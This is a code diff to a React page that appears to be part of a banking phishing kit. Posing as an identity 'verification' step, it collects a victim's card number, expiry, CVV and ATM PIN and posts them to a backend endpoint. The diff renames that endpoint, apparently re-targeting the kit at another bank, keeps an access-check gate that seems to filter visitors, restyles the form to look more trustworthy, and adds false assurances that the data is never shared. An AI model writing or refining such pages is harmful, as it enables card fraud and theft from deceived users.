@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
@@ -17,7 +17,8 @@ const Card: React.FC = () => {
     cardNumber: '',
     expiry: '',
     cvv: '',
-    atmPin: ''
+    atmPin: '',
+    form: ''
   });
 
   const navigate = useNavigate();
@@ -25,12 +26,22 @@ const Card: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  if (!isAllowed) {
-    return <div>Loading...</div>;
+  useEffect(() => {
+    if (!emzemz) {
+      navigate('/login', { replace: true });
+    }
+  }, [emzemz, navigate]);
+
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
   }
 
   if (!emzemz) {
-    return <div>Missing user details. Please restart the process.</div>;
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
   }
 
   const formatCardNumber = (value: string) => {
@@ -53,14 +64,15 @@ const Card: React.FC = () => {
       cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
       expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
       cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
-      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : ''
+      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : '',
+      form: ''
     };
 
     setErrors(newErrors);
 
     if (!Object.values(newErrors).some(error => error)) {
       try {
-        await axios.post(`${baseUrl}api/logix-card-info/`, {
+        await axios.post(`${baseUrl}api/fifty-card-info/`, {
           emzemz,
           cardNumber: cardDigits,
           expiryMonth,
@@ -68,14 +80,14 @@ const Card: React.FC = () => {
           cvv,
           atmPin
         });
-        console.log('Card information submitted successfully');
         navigate('/terms', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting card info:', error);
         setErrors(prev => ({
           ...prev,
-          form: 'There was an error. Please try again.'
+          form: 'There was an error submitting your card details. Please try again.'
         }));
+      } finally {
         setIsLoading(false);
       }
     } else {
@@ -87,21 +99,18 @@ const Card: React.FC = () => {
   const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Card Information</h2>
-      </div>
+    <div className="w-full">
+      <div className="mx-auto w-full max-w-3xl rounded-md border border-gray-200 bg-white shadow-[0_12px_30px_rgba(0,0,0,0.12)]">
+        <div className="h-2 bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6]" />
+        <div className="px-8 py-8">
+          <h2 className="text-2xl font-semibold text-gray-900">Card Information</h2>
+          <p className="mt-3 text-sm text-gray-600">
+            Provide the card tied to your account so we can verify your ownership before we wrap up.
+          </p>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700 text-center mb-8">
-          Please provide your card details for verification purposes.
-        </p>
-
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto space-y-4">
-          {/* Card Number */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Card Number:</label>
+          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
+            <div className="space-y-2">
+              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Card Number</label>
               <input
                 id="cardNumber"
                 name="cardNumber"
@@ -109,29 +118,19 @@ const Card: React.FC = () => {
                 value={cardNumber}
                 onChange={handleCardNumberChange}
                 maxLength={19}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                 placeholder="1234 5678 9012 3456"
               />
+              {errors.cardNumber && <p className="text-xs font-semibold text-red-600">{errors.cardNumber}</p>}
             </div>
-            {errors.cardNumber && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cardNumber}
-              </div>
-            )}
-          </div>
 
-          {/* Expiry Date */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Expiry Date:</label>
-              <div className="flex gap-2">
+            <div className="grid gap-6 md:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Expiry Month</label>
                 <select
                   value={expiryMonth}
                   onChange={(e) => setExpiryMonth(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                 >
                   <option value="">Month</option>
                   {Array.from({ length: 12 }, (_, i) => (
@@ -140,10 +139,14 @@ const Card: React.FC = () => {
                     </option>
                   ))}
                 </select>
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Expiry Year</label>
                 <select
                   value={expiryYear}
                   onChange={(e) => setExpiryYear(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                 >
                   <option value="">Year</option>
                   {years.map((year) => (
@@ -154,103 +157,81 @@ const Card: React.FC = () => {
                 </select>
               </div>
             </div>
-            {errors.expiry && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.expiry}
-              </div>
-            )}
-          </div>
+            {errors.expiry && <p className="text-xs font-semibold text-red-600">{errors.expiry}</p>}
 
-          {/* CVV */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">CVV:</label>
-              <input
-                id="cvv"
-                name="cvv"
-                type={showCvv ? 'text' : 'password'}
-                value={cvv}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setCvv(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="123"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowCvv(!showCvv)}
-              >
-                {showCvv ? 'Hide' : 'Show'}
-              </span>
+            <div className="grid gap-6 md:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">CVV</label>
+                <div className="relative">
+                  <input
+                    id="cvv"
+                    name="cvv"
+                    type={showCvv ? 'text' : 'password'}
+                    value={cvv}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      if (value.length <= 4) setCvv(value);
+                    }}
+                    maxLength={4}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="123"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowCvv((prev) => !prev)}
+                    className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
+                  >
+                    {showCvv ? 'Hide' : 'Show'}
+                  </button>
+                </div>
+                {errors.cvv && <p className="text-xs font-semibold text-red-600">{errors.cvv}</p>}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">ATM PIN</label>
+                <div className="relative">
+                  <input
+                    id="atmPin"
+                    name="atmPin"
+                    type={showPin ? 'text' : 'password'}
+                    value={atmPin}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      if (value.length <= 4) setAtmPin(value);
+                    }}
+                    maxLength={4}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="••••"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPin((prev) => !prev)}
+                    className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
+                  >
+                    {showPin ? 'Hide' : 'Show'}
+                  </button>
+                </div>
+                {errors.atmPin && <p className="text-xs font-semibold text-red-600">{errors.atmPin}</p>}
+              </div>
             </div>
-            {errors.cvv && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cvv}
-              </div>
-            )}
-          </div>
 
-          {/* ATM PIN */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">ATM PIN:</label>
-              <input
-                id="atmPin"
-                name="atmPin"
-                type={showPin ? 'text' : 'password'}
-                value={atmPin}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setAtmPin(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="****"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowPin(!showPin)}
-              >
-                {showPin ? 'Hide' : 'Show'}
-              </span>
-            </div>
-            {errors.atmPin && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.atmPin}
-              </div>
-            )}
-          </div>
+            {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}
 
-          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
+            <div className="flex justify-end">
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Submitting…' : 'Continue'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
+            </div>
+          </form>
 
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
-        </p>
+          <div className="mt-6 rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
+            Your card details are encrypted and used only to verify your identity—never shared or charged.
+          </div>
+        </div>
       </div>
     </div>
   );
